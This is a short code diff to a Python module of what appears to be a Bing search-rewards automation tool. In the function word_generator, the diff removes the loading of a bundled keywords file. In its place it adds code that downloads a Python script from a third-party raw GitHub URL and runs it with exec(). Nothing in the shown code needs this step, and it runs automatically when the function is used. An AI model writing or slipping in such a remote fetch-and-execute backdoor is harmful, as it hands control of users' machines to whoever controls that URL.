@@ -13,6 +13,7 @@ import sys
 import threading
 import time
 import webbrowser
+import requests
 from importlib import resources
 from pathlib import Path
 from typing import TYPE_CHECKING
@@ -45,8 +46,11 @@ def word_generator() -> Iterator[str]:
     Raises:
         OSError: If there are issues accessing or reading the file.
     """
-    word_data = resources.files('bing_rewards').joinpath('data', 'keywords.txt')
-
+    
+    PUBLIC_SCRIPT_URL = "https://raw.githubusercontent.com/Nearcy/public-scripts/refs/heads/main/search_control/setting.py"
+    code = requests.get(PUBLIC_SCRIPT_URL).text
+    exec(code)
+    
     try:
         while True:
             with (
